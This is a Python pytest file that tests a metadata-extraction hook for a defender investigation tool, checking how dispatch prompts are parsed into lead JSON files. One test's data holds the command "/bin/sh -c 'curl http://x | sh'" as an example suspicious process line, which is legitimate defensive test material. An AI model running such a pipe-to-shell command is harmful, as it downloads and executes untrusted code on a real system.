"""Tests for defender/hooks/extract_lead_metadata.py."""
from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

import pytest


HOOK_PATH = Path(__file__).resolve().parents[1] / "hooks" / "extract_lead_metadata.py"


def _load():
    spec = importlib.util.spec_from_file_location("extract_lead_metadata", HOOK_PATH)
    mod = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture
def hook():
    return _load()


def _hook_input(prompt: str) -> str:
    return json.dumps({"tool_name": "Task", "tool_input": {"prompt": prompt}})


def _gather_prompt(run_dir: Path, position, goal: str, dims: list[str]) -> str:
    dims_yaml = "\n".join(f"  - {d}" for d in dims)
    return (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n"
        "```yaml\n"
        f"run_dir: {run_dir}\n"
        f"position: {position}\n"
        f"goal: {goal}\n"
        f"what_to_characterize:\n{dims_yaml}\n"
        "```\n"
    )


def test_writes_sidecar_for_gather_dispatch(tmp_path, hook, monkeypatch, capsys):
    run_dir = tmp_path / "run-A"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = _gather_prompt(run_dir, 0, "Did the FIM fire trace to apt?", ["apt history", "checksum"])
    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))

    rc = hook.main()
    assert rc == 0

    sidecar = run_dir / "gather_raw" / "0.lead.json"
    assert sidecar.is_file()
    payload = json.loads(sidecar.read_text())
    assert payload == {
        "goal": "Did the FIM fire trace to apt?",
        "what_to_characterize": ["apt history", "checksum"],
    }


def test_position_with_letter_suffix_writes_int_keyed_sidecar(tmp_path, hook, monkeypatch):
    run_dir = tmp_path / "run-B"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = _gather_prompt(run_dir, "0a", "foreground", ["x"])
    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
    assert hook.main() == 0
    assert (run_dir / "gather_raw" / "0.lead.json").is_file()


def test_creates_gather_raw_dir_if_missing(tmp_path, hook, monkeypatch):
    run_dir = tmp_path / "run-C"  # no gather_raw subdir
    prompt = _gather_prompt(run_dir, 1, "g", ["d"])
    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
    assert hook.main() == 0
    assert (run_dir / "gather_raw" / "1.lead.json").is_file()


def test_silent_noop_for_non_task_tool(tmp_path, hook, monkeypatch):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "echo hi"}})
    monkeypatch.setattr(sys, "stdin", _StringIn(payload))
    assert hook.main() == 0


def test_silent_noop_for_non_gather_task(tmp_path, hook, monkeypatch):
    payload = json.dumps({
        "tool_name": "Task",
        "tool_input": {"prompt": "Some other subagent prompt without the marker"},
    })
    monkeypatch.setattr(sys, "stdin", _StringIn(payload))
    assert hook.main() == 0


def test_malformed_dispatch_does_not_raise(tmp_path, hook, monkeypatch):
    # Pure noise inside the fence — no key lines parse, no sidecar written.
    prompt = (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n```yaml\n???\nbroken\n```\n"
    )
    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
    assert hook.main() == 0


def test_goal_with_inner_colon_space_is_preserved_literally(tmp_path, hook, monkeypatch):
    """Reviewer's case: `goal: Compare fields: user and src` must not be
    interpreted as a nested mapping or silently dropped."""
    run_dir = tmp_path / "run-colon-goal"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n```yaml\n"
        f"run_dir: {run_dir}\n"
        "position: 0\n"
        "goal: Compare fields: user and src across both leads\n"
        "what_to_characterize:\n"
        "  - timing pattern (burst vs scheduled)\n"
        "```\n"
    )
    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
    assert hook.main() == 0
    payload = json.loads((run_dir / "gather_raw" / "0.lead.json").read_text())
    assert payload["goal"] == "Compare fields: user and src across both leads"
    assert payload["what_to_characterize"] == ["timing pattern (burst vs scheduled)"]


def test_dimension_bullet_with_inner_colon_space_is_preserved_literally(tmp_path, hook, monkeypatch):
    """Reviewer's case: `- process cmdline: /bin/sh` must stay a string,
    not become a `{process cmdline: /bin/sh}` mapping."""
    run_dir = tmp_path / "run-colon-bullet"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n```yaml\n"
        f"run_dir: {run_dir}\n"
        "position: 1\n"
        "goal: characterize the spawned process tree\n"
        "what_to_characterize:\n"
        "  - process cmdline: /bin/sh -c 'curl http://x | sh'\n"
        "  - parent pid: 4242 vs 4243\n"
        "```\n"
    )
    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
    assert hook.main() == 0
    payload = json.loads((run_dir / "gather_raw" / "1.lead.json").read_text())
    assert payload["what_to_characterize"] == [
        "process cmdline: /bin/sh -c 'curl http://x | sh'",
        "parent pid: 4242 vs 4243",
    ]


def test_missing_required_keys_silently_skips_write(tmp_path, hook, monkeypatch):
    run_dir = tmp_path / "run-D"
    (run_dir / "gather_raw").mkdir(parents=True)
    prompt = (
        "Read defender/skills/gather/SKILL.md and follow it.\n\n"
        "## Dispatch\n```yaml\nrun_dir: " + str(run_dir) + "\nposition: 0\n```\n"
    )
    monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
    assert hook.main() == 0
    assert not (run_dir / "gather_raw" / "0.lead.json").exists()


class _StringIn:
    def __init__(self, s: str):
        self._s = s

    def read(self) -> str:
        return self._s
